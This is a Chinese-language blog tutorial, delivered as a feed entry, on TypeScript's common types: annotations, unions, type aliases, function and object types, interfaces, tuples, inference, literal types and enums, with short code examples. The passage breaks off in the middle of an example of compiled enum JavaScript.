    <published>2022-06-16T04:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TypeScript-常用类型"><a href="#TypeScript-常用类型" class="headerlink" title="TypeScript 常用类型"></a>TypeScript 常用类型</h1><p>TypeScript 是 JS 的超集，TS 提供了 JS 的所有功能，并且额外的增加了：<strong>类型系统</strong></p><p><strong>JS 有类型</strong>（比如，number/string 等），但是 <strong>JS 不会检查变量的类型是否发生变化</strong>，而 TS 会检查</p><p>TypeScript 类型系统的主要优势：<strong>可以显示标记出代码中的意外行为，从而降低了发生错误的可能性</strong></p><h2 id="类型注解"><a href="#类型注解" class="headerlink" title="类型注解"></a>类型注解</h2><p>示例代码</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age: <span class="built_in">number</span> = <span class="number">18</span>;</span><br></pre></td></tr></table></figure><p>代码中<code>:number</code>就是类型注解</p><p><strong>类型注解约束了只能给该变量赋值该类型的值</strong></p><p>错误演示</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误原因：将 string 类型的值赋值给了 number 类型的变量，类型不一致</span></span><br><span class="line"><span class="keyword">let</span> age: <span class="built_in">number</span> = <span class="string">'18'</span>;</span><br></pre></td></tr></table></figure><h2 id="常用基础类型"><a href="#常用基础类型" class="headerlink" title="常用基础类型"></a>常用基础类型</h2><p>可以将 TS 中的常用基础类型分为两类</p><ol><li>JavaScript 已有类型<ul><li>原始类型： <strong><code>number/string/boolean/null/undefined/symbol</code></strong></li><li>对象类型：<strong><code>object</code></strong>(数组、对象、函数等)</li></ul></li><li>TypeScript 新增类型<ul><li>联合类型、自定义类型（类型别名）、接口、元祖、字面量类型、枚举、void、any 等</li></ul></li></ol><p>注意：原始类型在 TS 和 JS 中写法一致， 对象类型在 TS 中更加细化，每个具体对象都有自己的类型语法</p><h3 id="原始类型"><a href="#原始类型" class="headerlink" title="原始类型"></a>原始类型</h3><blockquote><p>特点：可完全按照 JavaScript 中的名称来书写</p></blockquote><p><strong><code>number/string/boolean/null/undefined/symbol</code></strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age: <span class="built_in">number</span> = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">let</span> username: <span class="built_in">string</span> = <span class="string">'张三'</span>;</span><br><span class="line"><span class="keyword">let</span> isMerry: <span class="built_in">boolean</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> unique: Symbol = Symbol(<span class="string">'shuiruohanyu'</span>);</span><br></pre></td></tr></table></figure><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><p>数组两种写法</p><ol><li><p><code>类型[]</code>写法， 如</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> userList: <span class="built_in">string</span>[] = [<span class="string">'John'</span>, <span class="string">'Bob'</span>, <span class="string">'Tony'</span>];</span><br><span class="line"><span class="keyword">let</span> peopleList: object[] = [&#123; name: <span class="string">'张三'</span>, age: <span class="number">18</span> &#125;];</span><br></pre></td></tr></table></figure></li><li><p>Array&lt;类型&gt;写法， 如</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user2List: <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt; = [<span class="string">'John'</span>, <span class="string">'Bob'</span>, <span class="string">'Tony'</span>];</span><br><span class="line"><span class="keyword">let</span> people2List: <span class="built_in">Array</span>&lt;object&gt; = [&#123; name: <span class="string">'张三'</span>, age: <span class="number">18</span> &#125;];</span><br></pre></td></tr></table></figure></li></ol><h3 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h3><p>组中既有 number 类型，又有 string 类型，这个数组的类型应该如何写?</p><p>可以用<code>|</code>(竖线)分割多个类型， 如</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: <span class="built_in">string</span> | <span class="built_in">number</span> = <span class="number">1</span>;</span><br><span class="line">str = <span class="string">'张三'</span>;</span><br></pre></td></tr></table></figure><p>如果数组中可以是字符串或者数字，则可以这么写</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: <span class="built_in">Array</span>&lt;<span class="built_in">number</span> | <span class="built_in">string</span>&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">'张三'</span>];</span><br></pre></td></tr></table></figure><h3 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h3><blockquote><p>当一个复杂类型或者联合类型过多或者被频繁使用时，可以通过类型别名来简化该类型的使用</p></blockquote><p>用法：<code>type</code> 名称 = 具体类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> CustomArray = <span class="built_in">Array</span>&lt;<span class="built_in">number</span> | <span class="built_in">string</span>&gt;;</span><br><span class="line"><span class="keyword">let</span> arr1: CustomArray = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">'张三'</span>];</span><br></pre></td></tr></table></figure><p>以上代码中，<code>type</code>作为创建自定义类型的关键字</p><ul><li>类型别名可以使任意合法的变量名称</li><li>推荐大驼峰的命名写法</li></ul><h3 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h3><p>函数类型需要指的是 <code>函数参数</code>和<code>返回值</code>的类型，这里分为两种写法</p><ul><li>第一种： 单独指定参数，返回值类型</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单独指定函数返回值和函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指定变量形式的</span></span><br><span class="line"><span class="keyword">const</span> add2 = (num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span>): <span class="function"><span class="params">number</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>第二种， 同时指定参数和返回值</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 同时指定参数和返回值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CustomFunc = <span class="function">(<span class="params">num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add3: CustomFunc = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意： 当函数作为表达式时，可以通过类似箭头函数形式的语法来为函数添加类型，这种形式<code>只适用于函数表达式</code></p><h4 id="void-类型"><a href="#void-类型" class="headerlink" title="void 类型"></a>void 类型</h4><p>当我们的函数定义为没有返回值的类型时，可用关键字<code>void</code>表示</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 没有返回值的函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CustomFunc1 = <span class="function">(<span class="params">num1: <span class="built_in">string</span>, num2: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> combinStr: CustomFunc1 = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br></pre></td></tr></table></figure><p>如果一个函数没有返回值，此时，在 TS 的类型中，应该使用 <code>void</code> 类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> add4 = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="comment">// 如果什么都不写 表示add4函数的类型为void</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add5 = (): <span class="function"><span class="params">void</span> =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="comment">// 这种写法明确指定返回值为void与上方的类型相同</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add6 = (): <span class="function"><span class="params">undefined</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 如果指定返回值为undefined  return undefined</span></span><br></pre></td></tr></table></figure><h4 id="函数可选参数"><a href="#函数可选参数" class="headerlink" title="函数可选参数"></a>函数可选参数</h4><p>当我们定义函数时，有的参数可传可不传，这种情况下，可以使用 TS 的可选参数来指定类型</p><p>比如，在使用数组的<code>slice</code>方法时，我们可以直接使用<code>slice()</code> 也可以传入参数 <code>slice(1)</code> 也可以<code>slice(1,3)</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> slice = (start?: <span class="built_in">number</span>, end?: <span class="built_in">number</span>): <span class="function"><span class="params">void</span> =&gt;</span> &#123;&#125;;</span><br></pre></td></tr></table></figure><p><code>?</code> 表示该参数或者变量可传可不传</p><p>注意：<strong>可选参数只能出现在参数列表的最后</strong>， 即必须参数必须在可选参数之前</p><h3 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h3><p>JS 中的对象是由属性和方法组成的，TS 的对象类型是<strong>对象中属性和方法的描述</strong></p><p>写法</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果有多个属性 可以换行 去掉间隔符号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> person3: &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  sayHello: <span class="built_in">Function</span>;</span><br><span class="line">&#125; = &#123;</span><br><span class="line">  name: <span class="string">'王五'</span>,</span><br><span class="line">  sayHello() &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>总结： 可是使用<code>{}</code>来描述对象结构</p><p>属性采用<code>属性名：类型</code>形式</p><p>函数可以采用 <code>方法名(): 返回值类型</code> 或者 <code>函数名: Function</code>（不指定返回值）的形式</p><h4 id="使用类型别名"><a href="#使用类型别名" class="headerlink" title="使用类型别名"></a>使用类型别名</h4><p>直接使用<code>{}</code>会降低代码可读性，不具有辨识度，更推荐使用类型别名添加对象类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> PersonObj = &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  sayHello(): <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1: PersonObj = &#123;</span><br><span class="line">  name: <span class="string">'高大大'</span>,</span><br><span class="line">  sayHello() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="带有参数的方法的类型"><a href="#带有参数的方法的类型" class="headerlink" title="带有参数的方法的类型"></a>带有参数的方法的类型</h4><p>如果对象中的函数带有参数，可以在函数中指定参数类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 带参数的函数方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PersonObj2 = &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  sayHello(start: <span class="built_in">number</span>): <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2: PersonObj2 = &#123;</span><br><span class="line">  name: <span class="string">'高大大'</span>,</span><br><span class="line">  sayHello(start) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="箭头函数形式的方法类型"><a href="#箭头函数形式的方法类型" class="headerlink" title="箭头函数形式的方法类型"></a>箭头函数形式的方法类型</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 箭头函数形式定义类型</span></span><br><span class="line"><span class="keyword">type</span> People = &#123;</span><br><span class="line">  sayHello: <span class="function">(<span class="params">start: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> p3: People = &#123;</span><br><span class="line">  sayHello() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="对象可选属性"><a href="#对象可选属性" class="headerlink" title="对象可选属性"></a>对象可选属性</h4><p>对象中的若干属性，有时也是可选的，此时我们依然可以使用<code>?</code>来表示</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Config = &#123;</span><br><span class="line">  method?: <span class="built_in">string</span>;</span><br><span class="line">  url: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> func = <span class="function">(<span class="params">config: Config</span>) =&gt;</span> &#123;&#125;;</span><br><span class="line">func(&#123; url: <span class="string">'/a'</span> &#125;);</span><br></pre></td></tr></table></figure><h3 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口 interface"></a>接口 interface</h3><p>当一个对象类型被多次使用时，一般使用接口（interface）描述对象的类型，达到复用的目的</p><ul><li>我们使用<code>interface</code>关键字来声明接口</li><li>接口名称推荐以<code>I</code>为开头</li><li>声明接口之后，直接使用接口名称作为变量的类型</li></ul><blockquote><p>接口后不需要分号</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> IPeople &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  age: <span class="built_in">number</span>;</span><br><span class="line">  sayHello(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p: IPeople = &#123;</span><br><span class="line">  name: <span class="string">'老高'</span>,</span><br><span class="line">  age: <span class="number">18</span>,</span><br><span class="line">  sayHello() &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="接口和自定义类型的区别"><a href="#接口和自定义类型的区别" class="headerlink" title="接口和自定义类型的区别"></a>接口和自定义类型的区别</h4><p>相同点：都可以给对象指定类型</p><p>不同点： 接口只能为对象指定类型， 类型别名可以为任意类型指定别名</p><ul><li>推荐用 type 来定义</li></ul><h4 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h4><ul><li>如果两个接口之间有相同的属性和方法，可以讲<strong>公共的属性和方法抽离出来，通过继承来实现复用</strong></li></ul><p>比如，这两个接口都有 x、y 两个属性，重复写两次，可以，但很繁琐</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point2D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Point3D &#123;</span><br><span class="line">  x: <span class="built_in">number</span>;</span><br><span class="line">  y: <span class="built_in">number</span>;</span><br><span class="line">  z: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>更好的方式</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Point2D &#123; x: <span class="built_in">number</span>; y: <span class="built_in">number</span> &#125;</span><br><span class="line"><span class="keyword">interface</span> Point3D <span class="keyword">extends</span> Point2D &#123;</span><br><span class="line">    z: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用<code>extends</code>关键字实现了 Point3D 继承了 Point2D 的所有属性的定义， 同时拥有继承的属性和自身自定义的属性</p><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>当我们想定义一个数组中具体索引位置的类型时，可以使用元祖。</p><blockquote><p>原有的数组模式只能宽泛的定义数组中的普遍类型，无法精确到位置</p></blockquote><p>元组是另一种类型的数组，它确切知道包含多少个元素，以及特定索引对应的类型</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> position: [<span class="built_in">number</span>, <span class="built_in">number</span>] = [<span class="number">39.5427</span>, <span class="number">116.2317</span>];</span><br></pre></td></tr></table></figure><h3 id="类型推论"><a href="#类型推论" class="headerlink" title="类型推论"></a>类型推论</h3><p>在 TS 中，某些没有明确指出类型的地方，<strong>TS 的类型推论机制会帮助提供类型</strong></p><p>也就是说，由于类型推论的存在，在某些地址类型注解可以省略不写。</p><ul><li>发生类型推论的常见场景</li></ul><ol><li>声明变量并初始化时</li><li>决定函数返回值时</li></ol><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量creater_name自动被推断为 string</span></span><br><span class="line"><span class="keyword">let</span> creater_name = <span class="string">'gaoly'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数返回值的类型被自动推断为 number</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addCount</span>(<span class="params">num1: <span class="built_in">number</span>, num2: <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推荐：<strong>能省略类型注解的地方就省略</strong>（<del>偷懒</del>，充分利用 TS 类型推论的能力，提升开发效率）</p><p>技巧：如果不知道类型，可以通过鼠标放在变量名称上，利用 VSCode 的提示来查看类型</p><h3 id="字面量类型"><a href="#字面量类型" class="headerlink" title="字面量类型"></a>字面量类型</h3><blockquote><p>下面的代码类型分别是什么？</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字面量类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str1 = <span class="string">'张三'</span>;</span><br><span class="line"><span class="keyword">const</span> str2 = <span class="string">'张三'</span>;</span><br></pre></td></tr></table></figure><p>通过 TS 的类型推导可以得到答案</p><p>1.变量 str1 的变量类型为： string</p><p>2.变量 str2 的变量类型为 ‘张三’</p><p>解释：str1 是一个变量(let)，它的值可以是任意字符串，所以类型为:string</p><p>str2 是一个常量(const)，它的值不能变化只能是 ‘张三’，所以，它的类型为:’张三’</p><p>此时，‘张三’就是一个<strong>字面量类型</strong>，即某个特殊的字符串也可以作为 TS 中的类型</p><p>任意的 JS 字面量（对象，数组，数字）都可以作为类型使用</p><h4 id="使用场景和模式"><a href="#使用场景和模式" class="headerlink" title="使用场景和模式"></a>使用场景和模式</h4><ul><li>使用模式：<strong>字面量类型配合联合类型一起使用</strong></li><li>使用场景：用来表示一组明确的可选值列表</li><li>比如，在贪吃蛇游戏中，游戏的方向的可选值只能是上、下、左、右中的任意一个</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Direction = <span class="string">'left'</span> | <span class="string">'right'</span> | <span class="string">'up'</span> | <span class="string">'down'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用自定义类型:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeDirection</span>(<span class="params">direction: Direction</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(direction);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数时，会有类型提示：</span></span><br><span class="line">changeDirection(<span class="string">'up'</span>);</span><br></pre></td></tr></table></figure><ul><li>解释：参数 direction 的值只能是 up/down/left/right 中的任意一个</li><li>优势：相比于 string 类型，使用字面量类型更加精确、严谨</li></ul><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><ul><li>枚举的功能类似于<strong>字面量类型+联合类型组合</strong>的功能，也可以表示一组明确的可选值</li><li>枚举：定义一组命名常量。它描述一个值，该值可以是这些命名常量中的一个</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 枚举</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建枚举</span></span><br><span class="line"><span class="keyword">enum</span> Direction2 &#123;</span><br><span class="line">  Up,</span><br><span class="line">  Down,</span><br><span class="line">  Left,</span><br><span class="line">  Right,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用枚举类型</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeDirection2</span>(<span class="params">direction: Direction2</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(direction);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数时，需要应该传入：枚举 Direction 成员的任意一个</span></span><br><span class="line"><span class="comment">// 类似于 JS 中的对象，直接通过 点（.）语法 访问枚举的成员</span></span><br><span class="line">changeDirection2(Direction2.Up);</span><br></pre></td></tr></table></figure><h4 id="数字枚举"><a href="#数字枚举" class="headerlink" title="数字枚举"></a>数字枚举</h4><ul><li>问题：我们把枚举成员作为了函数的实参，它的值是什么呢?</li><li>解释：通过将鼠标移入 Direction.Up，可以看到枚举成员 Up 的值为 0</li><li>注意：枚举成员是有值的，默认为：从 0 开始自增的数值</li><li>我们把，枚举成员的值为数字的枚举，称为：<code>数字枚举</code></li><li>当然，也可以给枚举中的成员初始化值</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Down -&gt; 11、Left -&gt; 12、Right -&gt; 13</span></span><br><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="number">10</span>,</span><br><span class="line">  Down,</span><br><span class="line">  Left,</span><br><span class="line">  Right,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="number">2</span>,</span><br><span class="line">  Down = <span class="number">4</span>,</span><br><span class="line">  Left = <span class="number">8</span>,</span><br><span class="line">  Right = <span class="number">16</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符串枚举"><a href="#字符串枚举" class="headerlink" title="字符串枚举"></a>字符串枚举</h4><ul><li>字符串枚举：枚举成员的值是字符串</li><li>注意：字符串枚举没有自增长行为，因此，<strong>字符串枚举的每个成员必须有初始值</strong></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="string">'UP'</span>,</span><br><span class="line">  Down = <span class="string">'DOWN'</span>,</span><br><span class="line">  Left = <span class="string">'LEFT'</span>,</span><br><span class="line">  Right = <span class="string">'RIGHT'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="枚举实现原理"><a href="#枚举实现原理" class="headerlink" title="枚举实现原理"></a>枚举实现原理</h4><ul><li>枚举是 TS 为数不多的非 JavaScript 类型级扩展(不仅仅是类型)的特性之一</li><li>因为：其他类型仅仅被当做类型，而枚举不仅用作类型，还提供值(枚举成员都是有值的)</li><li>也就是说，其他的类型会在编译为 JS 代码时自动移除。但是，<strong>枚举类型会被编译为 JS 代码</strong></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Direction &#123;</span><br><span class="line">  Up = <span class="string">'UP'</span>,</span><br><span class="line">  Down = <span class="string">'DOWN'</span>,</span><br><span class="line">  Left = <span class="string">'LEFT'</span>,</span><br><span class="line">  Right = <span class="string">'RIGHT'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会被编译为以下 JS 代码：</span></span><br><span class="line"><span class="keyword">var</span> Direction;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">Direction</span>) </span>&#123;</span><br><span class="line">  Direction[<span class="string">'Up'</span>] = <span class="string">'UP'</span></span><br><span class="line">  Direction[<span class="string">'Down'</span>] = <span class="string">'DOWN'</span></span><br><span class="line">  Direction[<span class="string">'Left'</span>] = <span class="string">'LEFT'</span></span><br><span class="line">  Direction[<span class="string">'Right'</span>] = <span class="string">'RIGHT'</span></span><br><span class="line">&#125;)(Direction || Direction = 